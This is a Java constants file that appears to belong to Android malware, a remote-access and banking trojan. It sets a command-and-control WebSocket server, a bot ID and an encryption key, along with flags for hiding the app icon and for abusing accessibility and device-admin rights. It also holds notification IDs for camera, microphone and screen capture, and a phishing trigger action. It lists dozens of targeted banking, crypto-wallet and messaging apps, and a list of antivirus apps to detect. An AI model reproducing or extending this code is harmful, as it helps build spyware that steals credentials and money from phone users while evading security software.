package com.xrc.system.core;

public final class Constants {
    private Constants() {}

    public static final String TAG = "XRC";
    public static final String PREFS_NAME = "xrc_cfg";
    public static final String PREF_FIRST_LAUNCH = "first_launch";
    public static final String PREF_ACCESSIBILITY = "acc_enabled";
    public static final String PREF_DEVICE_ADMIN = "admin_enabled";
    public static final String PREF_ICON_HIDDEN = "icon_hidden";
    public static final String PREF_C2_SERVER = "c2_server";
    public static final String PREF_BOT_ID = "bot_id";
    public static final String PREF_AES_KEY = "aes_key";

    public static final String DEFAULT_C2 = "wss://xrc-c2.example.com:8443";
    public static final int WS_RECONNECT_DELAY = 5000;
    public static final int WS_HEARTBEAT_INTERVAL = 30000;
    public static final int WATCHDOG_INTERVAL = 15000;

    public static final String CHANNEL_ID = "xrc_sys_channel";
    public static final int NOTIF_ID_CORE = 1337;
    public static final int NOTIF_ID_WATCHDOG = 1338;
    public static final int NOTIF_ID_CAMERA = 1339;
    public static final int NOTIF_ID_MIC = 1340;
    public static final int NOTIF_ID_SCREEN = 1341;

    public static final String ACTION_HIDE_ICON = "com.xrc.system.HIDE_ICON";
    public static final String ACTION_SHOW_OVERLAY = "com.xrc.system.SHOW_OVERLAY";
    public static final String ACTION_START_SERVICES = "com.xrc.system.START_SERVICES";
    public static final String ACTION_PHISH_TRIGGER = "com.xrc.system.PHISH_TRIGGER";

    public static final String[] TARGET_PACKAGES = {
        "com.whatsapp", "com.facebook.katana", "com.instagram.android",
        "com.twitter.android", "com.snapchat.android", "com.discord",
        "com.zhiliaoapp.musically", "com.tencent.mm", "com.tencent.mobileqq",
        "com.viber.voip", "com.vkontakte.android", "com.google.android.gm",
        "com.google.android.apps.messaging", "com.android.chrome",
        "com.binance.dev", "com.coinbase.android", "io.metamask",
        "com.bitget.exchange", "app.phantom", "com.wallet.crypto.trustapp",
        "com.moonpay", "exodusmovement.exodus", "com.dydx.trading",
        "com.liberty.jaxx", "com.bybit.app", "com.htx.android",
        "com.okinc.okex", "io.atomicwallet", "pi.blockchain.android",
        "com.coinomi.wallet", "com.crypto.app", "com.edge.wallet",
        "com.airstar.bank", "com.eg.android.AlipayGphone", "com.boc.bocpay",
        "com.hsbc.hsbcsingapore", "com.chase.sig.android",
        "com.revolut.revolut", "com.alfabank.android", "com.paypal.android.p2pmobile",
        "com.google.android.apps.walletnfcrel", "com.samsung.android.spay",
        "com.allybank", "com.bluevine", "com.capitalone.mobile",
        "com.chime", "com.creditone", "com.currencyfair",
        "com.discover", "com.greenfi"
    };

    public static final String[] SECURITY_APPS = {
        "com.avast.android.mobilesecurity", "com.bitdefender.antivirus",
        "com.kaspersky.mobile.antivirus", "com.symantec.mobilesecurity",
        "com.lookout", "com.mcafee.android", "com.cleanmaster.mguard",
        "com.cmsecurity.lite", "com.ijinshan.security", "com.qihoo360.mobilesafe",
        "com.drweb", "com.eset.parental", "com.sophos.smsec",
        "com.google.android.apps.securityhub"
    };
}
